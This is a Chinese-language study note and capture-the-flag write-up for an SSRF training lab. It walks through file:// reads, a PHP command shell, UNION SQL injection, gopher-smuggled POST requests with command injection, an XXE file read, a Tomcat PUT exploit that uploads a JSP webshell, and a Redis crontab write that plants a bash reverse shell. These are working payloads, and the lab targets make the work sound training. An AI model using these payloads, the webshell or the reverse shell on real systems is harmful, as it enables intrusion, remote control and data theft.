---
title: 'ssrf学习笔记'
published: 2026-05-01
description: 'ssrf_labs wp'
tags: [Security]
category: note
draft: false
---

# SSRF（Server-Side Request Forgery，服务端请求伪造）

**攻击者利用服务端的缺陷，诱骗服务器主动发起请求，去访问攻击者指定的地址（内网地址、本地地址、其他外部服务）**。

> **请求是【服务器】发出去的，不是浏览器**。

**原理简述**

Web 应用会接收用户传入的 URL 参数，服务端代码去拉取这个 URL 对应的资源（比如图片、远程内容）。 如果没有对传入的目标地址做过滤，攻击者就可以传入内网 IP、本地回环地址，让服务器访问内网资源。

> 举个场景： 业务：`?url=https://xxx.com/img.jpg`，后端用 curl 去下载图片。 攻击者传：`?url=http://127.0.0.1:3306`，后端就会去访问本机 MySQL 端口。

**常见攻击目标**

1. **探测内网存活主机、端口扫描**：访问`192.168.x.x`、`10.x.x.x`内网网段，看哪些端口开放。
2. **访问本地服务**：`127.0.0.1`，读取本地服务接口、元数据。
3. **访问云服务器元数据服务**（经典高危场景）：阿里云 / AWS 元数据接口，获取实例密钥、token。
4. **对内网应用发起攻击**：比如内网 Redis、Mongo，执行命令。
5. **绕过 WAF**：外部不能直接访问内网，但服务器在内网，相当于天然跳板。

**常见绕过手法**

- 域名解析跳转（域名 A 记录指向内网 IP）
- IP 进制转换：`127.0.0.1` 写成 `0x7f000001`、十进制长整型
- 特殊 DNS、IPv6 地址
- 302 重定向绕过：后端不校验跳转后的地址

**防御方案**

1. 白名单：只允许指定域名 / IP，**不要黑名单**；

2. 禁止解析到内网 IP、127.0.0.1；

3. 禁用重定向，或者校验跳转后的目标；

4. 限制请求协议：只允许 http/https，禁止 file://、gopher:// 等危险协议；

5. 请求超时，限制请求大小；

6. 不要使用服务器元数据。

   

下面就开始打 SSRF 的靶场了。本人是纯萌新，wp会写的比较详细，方便自己复习。

![QQ_1742260818430.png](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260930094925471.png)

## 一、入口（SSRF 漏洞机）

页面上已经把后端源码给出来了：零过滤。这里 `curl` 支持的协议（`http/file/gopher/dict...`）全部可用。

![image-20260930101753631](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260930101753722.png)

跟着提示用 `file://` 协议查看当前主机的hosts文件：`file:///etc/hosts`。可以看到本服务器的IP地址。

![image-20260930105733898](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260930105733991.png)

## 二、CodeExec

现在进行内网探测：发现 `index.php` 和 `shell.php` 两个文件。

![image-20260930111527330](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260930111527368.png)

看下 `shell.php` 长什么样：

![image-20260930123629303](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260930123629519.png)

整理一下就是：

```
<?php
highlight_file(__FILE__);

$cmd = $_GET['cmd'];
if (isset($cmd)) {
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
```

借助此php文件，我们就可以通过cmd传参，进行命令执行，比如说：

```
http://172.72.23.22/shell.php?cmd=whoami
```

可以看到当前用户为 `www-data`，RCE 成立。

![0b443003-cd79-410f-afc8-72d2e0ff9fce](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260930185627671.png)

找一下 flag ：

```
http://172.72.23.22/shell.php?cmd=find / -name "*flag*" 2>/dev/null
```

![dabf1fdc-c18d-4525-a204-d052d6f99229](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260930213652248.png)

```
http://172.72.23.22/shell.php?cmd=cat /flag
```

![51393a16-48c8-49d3-9159-3591214f68ad](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260930213827596.png)

拿到 FLAG！

## 三、SQLI

1. 先进行基本的内网探测：看起来是个查询接口，参数名叫 id。指纹到手。

   ![image-20260930214639182](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260930232753695.png)

   确认一下注入的存在。先正常用 `http://172.72.23.23/?id=1` → 返回 `user1 / OHHHHHHH`，是正常业务。

   ![image-20260930235954774](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260930235954850.png)

   单引号试探 `http://172.72.23.23/?id=1'` ：报错回显，看着应该是整型注入。

   ![image-20261001000047858](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261001000047927.png)

   

   验证一下：确认存在注入点，且是整型注入。

   ![image-20261001000139367](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261001000139416.png)

   ![image-20261001000219814](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261001000219877.png)

2. 接下来就是联合查询注入的那些套路操作。

   先猜列数：`?id=1 order by 3`正常，`?id=1 order by 4` 报 `Unknown column '4'`  → 3 列。

   找回显位：`?id=-1 union select 1,2,3` → 页面回显 `1 / 2 / 3`。→ 三个位置都是回显的。

   ![image-20260930234825818](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260930234825907.png)

   侦察数据库环境：`?id=-1 union select 1,version(),database()` → `10.6.14-MariaDB/ctf`

   ![image-20261001000324333](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261001000324397.png)

   查表：`http://172.72.23.23/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctf'`。有两张表：`flag,users`

   ![image-20261001000423284](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261001000423348.png)

   查字段：`http://172.72.23.23/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='ctf' and table_name='flag'`。拿到字段名：`id,data`。

   ![image-20261001000642722](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261001000642795.png)

   查数据：`http://172.72.23.23/index.php?id=-1 union select 1,2,group_concat(data) from flag`

   ![image-20261001003235742](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261001003235926.png)

拿到FLAG！

## 四、commandExec

先学习下 gopher ：一个上古协议，但对渗透者来说它的意义是——`gopher://主机:端口/_后面所有内容`：curl 会把下划线后面的内容**原封不动当作 TCP 裸数据**发往那个主机端口。

之前用 `http://`，curl 替我们决定发什么报文（固定是 GET）；换 `gopher://`，报文每一个字节都由自己决定。想发 POST？想让目标连 Redis？想跟 MySQL 握手？只要手搓得出协议报文，gopher 都能递过去。所以它叫“SSRF 万能钥匙”。

> - **下划线 `_` 只是占位符** (gopher 协议格式要求类型字符占一位，大家约定俗成用 `_` 糊弄过去),真正发货的是它后面的全部内容。

gopher 的存在意义，是**弥补 curl 默认 GET 带不来的东西**。



1. 内网探测，`http://172.72.23.24/`：出来的是一个页面代码信息，分析一下

   ```
   请求结果
   <!DOCTYPE html>
   <html lang="zh-CN">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Network Status Checker</title>
       <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
       <style>
           body {
               background-color: #f8f9fa;
               padding-top: 2rem;
           }
           .checker-container {
               background: white;
               padding: 2rem;
               border-radius: 10px;
               box-shadow: 0 0 15px rgba(0,0,0,0.1);
               margin-bottom: 2rem;
           }
           .result-area {
               margin-top: 20px;
               background: #f8f9fa;
               padding: 15px;
               border-radius: 5px;
               border: 1px solid #dee2e6;
           }
           .api-info {
               color: #6c757d;
               font-size: 0.9rem;
               margin-top: 1rem;
           }
       </style>
   </head>
   <body>
       <div class="container">
           <div class="checker-container">
               <h3 class="mb-4">Network Status Checker API</h3>
               
               <form method="POST" action="ping.php" class="mb-4">
                   <div class="row g-3 align-items-center">
                       <div class="col-auto">
                           <input type="text" class="form-control" 
                                  name="target" placeholder="输入IP地址或域名"
                                  pattern="^[a-zA-Z0-9.-]+$" 
                                  title="请输入有效的IP地址或域名">
                       </div>
                       <div class="col-auto">
                           <button type="submit" class="btn btn-primary">检测</button>
                       </div>
                   </div>
               </form>
   
               <div class="api-info">
                   <h6>API 使用说明：</h6>
                   <ul>
                       <li>使用原生Linux命令 ping -c 4 进行检测</li>
                       <li>支持 IPv4 地址和域名检测</li>
                       <li>默认发送4个数据包</li>
                   </ul>
               </div>
           </div>
       </div>
   
       <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
   </body>
   </html>
   ```

   这个 HTML 页面是一个简单的网络状态检测工具前端，核心功能是让用户输入 IP / 域名，通过后端 ping.php 执行 Linux ping 命令检测网络连通性。

   功能分析：

   ```
   请求方式：method="POST"。
   提交目标：action="ping.php"，明确后端处理文件路径。
   输入验证：通过pattern="^[a-zA-Z0-9.-]+$"做前端输入过滤，仅允许 IP / 域名的合法字符（禁止;、&、|等特殊符号），但前端验证可轻松绕过（如修改 HTML 代码、抓包改参数）。
   ```

2. 页面源码里取参数用的是 `$_POST['target']`，它只认 POST 请求体 里的 `target`。但是 `http://` 协议这条路，是curl 替我们决定发什么报文，固定是 GET，所以这条路也就走死了。但是用`gopher://`协议的话，报文的每一个字节都是我们决定，想发 POST自然不成问题。

   现在我们手搓一个完整的 HTTP POST 请求。目标：让24号机的 ping.php 收到 `target=127.0.0.1;cat /flag`（分号让 ping 执行完后接着执行 cat /flag，命令注入）：

   ```
   POST /ping.php HTTP/1.1
   Host: 172.72.23.24
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 26
   
   target=127.0.0.1;cat /flag
   ```

   使用gopher协议需要进行两次 URL 编码。（我们自己编码一次，浏览器打包表单的时候还会自动编码一次，加起来就两次了。对应的，入口机 PHP 收表单的时候会自动解码一次，入口机 Curl 出发前会再解码一次，这样发给目标机机子的其实还是裸报文）

   ![image-20261001045858059](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261001045858177.png)

   得到：

   ```
   %50%4f%53%54%20%2f%70%69%6e%67%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%34%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%32%36%0a%0a%74%61%72%67%65%74%3d%31%32%37%2e%30%2e%30%2e%31%3b%63%61%74%20%2f%66%6c%61%67
   ```

   然后使用下面语句后面加上编码的语句进行访问即可：

   ```
   gopher://172.72.23.24:80/_
   ```

   ![image-20261001050101188](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261001050101284.png)

   拿到flag。

## 五、XXE

先来学习下XXE：

XXE 是**XML 解析器在解析 XML 文档时，支持加载外部实体，攻击者通过构造恶意 XML，利用外部实体读取本地文件、发起内网请求，甚至在部分老旧环境下执行命令**的漏洞。

> 核心前提：后端使用了不安全的 XML 解析库，**没有禁用外部实体与 DTD**。

XML： 一种和 HTML 长得像的数据格式。用标签包裹数据，但标签名自己定。

DTD 和实体：XML 自带的“宏”功能。 XML 允许在正文前面附一段“说明”，叫 DTD（文档类型定义），格式是 `<!DOCTYPE 根标签名 [ ...定义... ]>`。里面最有用的就是实体，可以理解为“宏”或“变量”。

```
<!ENTITY xxe "Hello">        ← 定义宏：名字叫 xxe，内容是 Hello
<username>&xxe;</username>   ← 使用宏：&名字; 会被替换成内容
```

外部实体：宏的内容可以“让服务器自己去拿”。 定义实体时加 `SYSTEM` 关键字，内容就不是写死的文字，而是一个**地址**，XML 解析器会主动去读它：

```
<!ENTITY xxe SYSTEM "file:///flag">   ← 内容 = 本地文件 /flag 的内容！
```

支持 `file://`（读本地文件）、`http://`（发网络请求——所以 XXE 经常同时就是一个 SSRF）、`ftp://` 等。

**漏洞成因拼图**：当一台服务器 **①解析用户提交的 XML** + **②没有禁用外部实体** + **③实体内容会被回显**，三环凑齐 = 黑客往 XML 里塞一个“去读 /flag 的宏”，服务器解析时乖乖替黑客读了文件，并把内容贴在响应里送回。



先探测下这关的回显：

```
请求结果
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XXE漏洞实验环境</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { padding-top: 50px; }
        .login-container {
            max-width: 500px;
            margin: 0 auto;
            padding: 15px;
        }
        .form-group { margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="container login-container">
        <div class="card">
            <div class="card-body">
                <h2 class="text-center mb-4">用户登录</h2>
                <div class="form-group">
                    <label for="username">用户名</label>
                    <input type="text" class="form-control" id="username">
                    <small class="form-text text-muted">默认用户名：admin</small>
                </div>
                <div class="form-group">
                    <label for="password">密码</label>
                    <input type="password" class="form-control" id="password">
                    <small class="form-text text-muted">默认密码：admin</small>
                </div>
                <button type="submit" class="btn btn-primary w-100" onclick="login()">登录</button>
                <div id="result" class="mt-3"></div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <script type='text/javascript'> 
    function login(){
        var username = $("#username").val();
        var password = $("#password").val();
        if(username == "" || password == ""){
            Swal.fire({
                icon: 'error',
                title: '错误',
                text: '用户名或密码不能为空'
            });
            return;
        }
        
        var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
        $.ajax({
            type: "POST",
            url: window.location.href,
            contentType: "application/xml;charset=utf-8",
            data: data,
            dataType: "xml",
            success: function (result) {
                var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
                var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
                if(code == "0"){
                    Swal.fire({
                        icon: 'error',
                        title: '登录失败',
                        text: '用户名或密码错误'
                    });
                }else if(code == "1"){
                    Swal.fire({
                        icon: 'success',
                        title: '登录成功',
                        text: 'XXE！，' + msg
                    });
                }else{
                    Swal.fire({
                        icon: 'error',
                        title: '系统错误',
                        text: msg
                    });
                }
            },
            error: function(xhr, status, error) {
                Swal.fire({
                    icon: 'error',
                    title: '请求错误',
                    text: error
                });
            }
        }); 
    }
    </script>
</body>
</html>
```

是一个登录页面的HTML。最下面的`<script>` 里是 `login()` 函数。登录数据格式是 XML，不是表单；请求方法是 POST， 入口机 http:// 只会发 GET，所以这关和 `commandExec` 一样要用 gopher 手搓 POST HTTP 报文，只是 body 换成 XML、Content-Type 换成 application/xml；

![f71e659c-e08e-41cd-b52b-71b84a2bf68a](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261004031133171.png)

先构造正常登录报文对试一下：

```
POST /index.php HTTP/1.1
Host: 172.72.23.25
Content-Type: application/xml
Content-Length: 86

<?xml version="1.0"?><user><username>admin</username><password>admin</password></user>
```

Burp 编码：

```
%50%4f%53%54%20%2f%69%6e%64%65%78%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%35%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%38%36%0a%0a%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%3f%3e%3c%75%73%65%72%3e%3c%75%73%65%72%6e%61%6d%65%3e%61%64%6d%69%6e%3c%2f%75%73%65%72%6e%61%6d%65%3e%3c%70%61%73%73%77%6f%72%64%3e%61%64%6d%69%6e%3c%2f%70%61%73%73%77%6f%72%64%3e%3c%2f%75%73%65%72%3e
```

通过 gopher 协议发射：code=1 登录成功， msg 回显了 username 的值。

![image-20261004033402773](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261004033403638.png)

接下来构造 XXE payload。新增 DOCTYPE 声明区。里面定义外部实体：名字 xxe，SYSTEM 表示"内容不写死，去这个地址取"，`file:///flag` 就是让服务器读自己的文件。username 的值不写 admin，改成 `&xxe;`引用实体。

```
POST /index.php HTTP/1.1
Host: 172.72.23.25
Content-Type: application/xml
Content-Length: 139

<?xml version="1.0"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///flag">]><user><username>&xxe;</username><password>admin</password></user>
```

```
%50%4f%53%54%20%2f%69%6e%64%65%78%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%35%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%33%39%0a%0a%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%75%73%65%72%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22%3e%5d%3e%3c%75%73%65%72%3e%3c%75%73%65%72%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%75%73%65%72%6e%61%6d%65%3e%3c%70%61%73%73%77%6f%72%64%3e%61%64%6d%69%6e%3c%2f%70%61%73%73%77%6f%72%64%3e%3c%2f%75%73%65%72%3e
```

拼进`gopher://172.72.23.25:80/_`：

![image-20261004040829226](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261004040829343.png)

拿到FLAG!

## 六、Tomcat

这关是真实的**CVE-2017-12615**的复现，Tomcat PUT 任意文件写入：当 DefaultServlet 的 `readonly` 配置为 `false` 时，可以用 PUT 方法向服务器写任意文件。

先学习下 JSP：HTML 里嵌 Java 的服务端页面，和 PHP 类似——文件被访问时，Tomcat 把它编译成 Java 程序执行。所以只要把一个 .jsp 文件写进网站目录，访问它就等于让服务器运行我们写的代码。

一句话木马（241 字节）：

```
<%@ page import="java.io.*"%><%String c=request.getParameter("cmd");Process p=Runtime.getRuntime().exec(c);BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=b.readLine())!=null)out.println(l);%>
```

对照下php的一句话木马：`request.getParameter("cmd")` 就是 PHP 的 `$_GET['cmd']`；`Runtime.getRuntime().exec(c)` 是 Java 执行系统命令，等价 `system()`；后面的 while 循环把命令输出打印到响应，等价 `echo`。



先探测一下：`http://172.72.23.26:8080/`（8080 是 Tomcat 的惯例端口）。回显 Tomcat 默认首页，页面上能看到版本号 `Apache Tomcat/8.5.19`。版本号8.5.19 存在 CVE-2017-12615：**当 Tomcat 的 DefaultServlet 配置了 `readonly=false` 时，可以用 PUT 方法向服务器写任意文件**。

![132144c1-ea98-4fc1-bb8e-0fb7a819e609](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261004102404126.png)

手搓 PUT 报文上传木马：

```
PUT /cmd.jsp/ HTTP/1.1
Host: 172.72.23.26:8080
Content-Length: 241

<%@ page import="java.io.*"%><%String c=request.getParameter("cmd");Process p=Runtime.getRuntime().exec(c);BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=b.readLine())!=null)out.println(l);%>
```

（路径结尾为什么要带 `/`：URL 以 `.jsp` 结尾会被路由给 JSP Servlet，它只负责执行，禁止写文件；加个尾部斜杠，后缀不再是 `.jsp`，请求落到 `readonly=false` 的 `DefaultServlet`（允许 PUT 写入）；Tomcat 落盘时会把尾部斜杠规范化掉，磁盘上的文件名还是 `cmd.jsp`。等于让写请求走允许写的那条路，落盘却落成一个会被执行的 .jsp。）

Burp编码：

```
%50%55%54%20%2f%63%6d%64%2e%6a%73%70%2f%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%36%3a%38%30%38%30%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%32%34%31%0a%0a%3c%25%40%20%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%69%6f%2e%2a%22%25%3e%3c%25%53%74%72%69%6e%67%20%63%3d%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%3b%50%72%6f%63%65%73%73%20%70%3d%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%63%29%3b%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%62%3d%6e%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%70%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%53%74%72%69%6e%67%20%6c%3b%77%68%69%6c%65%28%28%6c%3d%62%2e%72%65%61%64%4c%69%6e%65%28%29%29%21%3d%6e%75%6c%6c%29%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6c%29%3b%25%3e
```

拼 `gopher://172.72.23.26:8080/_` 发射：成功上传。

![image-20261004105711514](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261004105711749.png)

GET 触发执行：GET 没有 body，**服务器靠结尾空行判断报文结束**，空行丢了 Tomcat 一直傻等不响应。

```
GET /cmd.jsp?cmd=cat%20/flag HTTP/1.1
Host: 172.72.23.26:8080

```

```
%47%45%54%20%2f%63%6d%64%2e%6a%73%70%3f%63%6d%64%3d%63%61%74%25%32%30%2f%66%6c%61%67%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%36%3a%38%30%38%30%0a
```

![image-20261004110333792](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261004110333896.png)

拿到FLAG！

## 七、Redisunauth

这关是经典的 **Redis 未授权访问 + 写 crontab 反弹 shell**。

先学习下 Redis 协议：比 HTTP 简单得多，一行就是一条命令，换行结尾，没有请求头也没有 Content-Length（这叫 inline 模式）。每段 payload 结尾都要有 `QUIT`：Redis 不会主动断开连接，curl 在等"响应结束信号"，等不到就永远挂着（和 Tomcat那题的空行是一样的，由服务器决定响应何时结束），QUIT 让 Redis 关闭连接，响应才能回来。

再学习下反弹 shell：平时都是我们主动连服务器、发请求看响应；反弹 shell 把方向反过来——**让目标机自己发起一条网络连接，连到我们的攻击机上，并把它的命令行挂在这条连接上**，反弹 指的就是这个连接方向。连接建立后，攻击机屏幕上就出现一个目标机的终端：敲什么命令。目标机就执行什么，结果会原路传回来。



探测，端口 6379（Redis 惯例端口）。就两条命令：

```
INFO  让 Redis 报告自己的信息（版本、模式等）
QUIT  让 Redis 关闭连接
```

Burp 编码后拼 gopher 发射（`%0d%0a` 就是每行结尾的回车换行）：

```
gopher://172.72.23.27:6379/_%49%4e%46%4f%0a%51%55%49%54%0a
```

回显了一大段 服务器信息——未授权实锤：Redis，只要设了密码（`requirepass`），任何客户端在认证之前发的每一条命令都会被拒绝，只会收到一行错误-`NOAUTH Authentication required.`，想看什么都得先 `AUTH 密码`，所以有这样的回显就是没设密码，未经授权就能访问。

![image-20261004125319693](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261004125319939.png)

**攻击原理：**Redis 有个功能，把内存中的数据存盘（SAVE 命令），存到 某个目录下某个文件名，而目录和文件名由 `CONFIG SET dir` / `CONFIG SET dbfilename` 控制，运行中随时可改；写入的内容 = 数据库里 key 的值，`SET` 想写什么就写什么。

 `CONFIG SET dir` / `CONFIG SET dbfilename`/`set` 三者拼起来就是**任意路径、任意文件名、任意内容的文件写入**。那往哪个文件写？先摸清这台机上有什么可利用的东西：

- 没有 web 服务：用入口对它的常见 web 端口（80/8080/443）逐个探测，全部无响应——写 webshell 这条路不存在；
- 跑着 crond（Linux 系统里负责定时任务的后台进程，每分钟检查一遍定时任务文件，到点就以文件所属用户的身份执行里面的命令）：`CONFIG SET dir /var/spool/cron` 返回 `+OK` 说明这个目录真实存在（目录不存在 Redis 会报错），再写一条测试命令进去，等一分钟看它是否被执行，执行了就确定 crond 在跑。

所以选定写入目标：`/var/spool/cron/root`（root 用户的定时任务文件）。

flag 是磁盘上的文件，Redis 只能写文件不能读文件，cron 执行命令的输出也不会经过 Redis 传回来，所以这条攻击链全程没有任何回显。考虑反弹 shell。

① 反弹 shell 需要一台接应机（目标机要连到一台我们控制的机器上），准备工作：

```
docker network connect ssrf-labs_ssrf_labs boring_keldysh
```
boring_keldysh 容器（后面称 attacker）是接应机，但它原来在 Docker 默认的 bridge 网络里，和靶场内网不互通；这条命令把它接入靶场网络，接入后它在内网的 IP = `172.72.23.2`

attacker 镜像里没有 nc（netcat，最朴素的老牌网络工具，能监听端口收发数据，反弹 shell 的接应端就靠 nc）且 apt 源失效（这个 Debian 版本已停止维护，软件源下架了），所以从靶场里的 alpine 机器把 busybox（把几十个常用小工具打包成一个文件的程序，自带 nc）连同 musl 加载器（busybox 的运行库，不一起拷过去 attacker 跑不起来）拷过去：

```
docker exec ssrf-labs-web4_commandexec-1 tar cf - -C / bin/busybox lib/ld-musl-x86_64.so.1 | docker exec -i boring_keldysh tar xf - -C /
```

到这儿接应机就搞定了。

② 先在 attacker 上开监听：

```
docker exec -it boring_keldysh /bin/busybox nc -l -p 4444
```

（`docker exec -it` 进入 attacker 容器并保持交互；`/bin/busybox nc` 用拷进去的 busybox 调出 nc；`-l` 监听模式；`-p 4444` 监听端口。）

![image-20261004134430997](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261004134431104.png)

③ 现在手搓 Redis 命令（Burp 编码后拼 `gopher://172.72.23.27:6379/_`）：

```
CONFIG SET dir /var/spool/cron   → 把Redis的"存盘目录"改成root定时任务目录
CONFIG SET dbfilename root       → 把"存盘文件名"改成root
SET xx "\n* * * * * bash -i >& /dev/tcp/172.72.23.2/4444 0>&1\n" →往数据库塞一个名叫xx的key,值=""里的
SAVE                             → 立即存盘:数据库内容落盘成/var/spool/cron/root
QUIT                             → 关闭连接,响应才能回来
```

SET 的值里那串反弹 shell 逐段拆一下理解：

```
* * * * *                        cron时间表:每分钟执行一次后面的命令
bash -i                          启动一个交互式bash(-i=interactive,带提示符、能敲命令)
>& /dev/tcp/172.72.23.2/4444     把输出发到这条TCP连接(/dev/tcp/IP/端口是bash的特殊文件,往里写=发TCP)；
0>&1                             把键盘输入也接到同一条连接(0=标准输入,1=标准输出)
```

合起来的效果：crond 每分钟执行一次这条命令 → bash 启动，把自己的输入、输出全部挂到"连往 attacker:4444 的连接"上 → attacker 屏幕上出现目标机的终端。

发射后回显一排 `+OK`（+OK 是 Redis 对 命令执行成功 的标准应答，5 条命令逐条一个）：

![image-20261004133940480](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261004133940722.png)

④ 等 cron 整分钟触发，监听窗口弹出 bash 提示符——shell 到手。直接 `cat  /flag`，拿到FLAG。

![image-20261004134710594](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20261004134710689.png)

攻击链如下：

```
① 探测：gopher 发 INFO 到 172.72.23.27:6379
    │  回显 redis_version:5.0.5 → 确认是 Redis；
    │  没发 AUTH 就有数据 → 未授权实锤（有密码此处只回 NOAUTH）
    ▼
② 寻找利用点：Redis 没有"读文件"的命令 → 直接读 flag 出局；
    │  但 SAVE 落盘 + CONFIG SET dir / dbfilename 运行时可改 + SET 控制内容
    │  三者拼成：任意路径、任意文件名、任意内容的文件写入原语
    ▼
③ 选目标文件：盘点这台机上什么服务会"自动执行文件内容"
    │  无 web（80/8080 探测无响应 → webshell 出局）
    │  无 sshd → 写 authorized_keys 出局
    │  CONFIG SET dir /var/spool/cron 回 +OK（目录真实存在）
    │  + 写测试命令一分钟后被执行 → crond 在跑 → 写 crontab 胜出
    ▼
④ 落地：CONFIG SET dir /var/spool/cron → CONFIG SET dbfilename root
         → SET xx "\n* * * * * bash -i >& /dev/tcp/172.72.23.2/4444 0>&1\n"
         → SAVE → QUIT
    │  内核：SET 值里的 \n 让 cron 行从 RDB 开头的二进制杂讯里独立成行，
    │  cron 逐行解析时才会认它（前后 \n 就是隔离带）
    ▼
⑤ 引爆：crond 每分钟整点执行 root 任务文件 → bash 反连 attacker:4444
    │  内核：本链全程无回显（Redis 读不了文件、cron 输出不经过 Redis）
    │  → 结果必须走带外，反弹 shell 就是那条外带通道
    ▼
⑥ 接应：attacker(172.72.23.2:4444) 的 nc 收到反连
    │  目标机 root 终端长在监听窗口 → cat /flag
    ▼
⑦ helloct{you_got_flag_27} → 通关 ✅
```

